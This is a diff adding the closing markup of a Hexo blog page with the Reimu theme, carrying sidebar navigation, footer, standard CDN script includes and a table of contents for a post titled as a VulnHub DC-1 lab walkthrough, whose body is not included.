+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        hanggerui88
+      </div>
+      
+        <div>
+          Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          13.7k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          01:03
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">VulnHubDC—DC-1靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">打靶机</span></a></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="hanggerui88" class="lazyload">
+  <div class="sidebar-author-name">hanggerui88</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
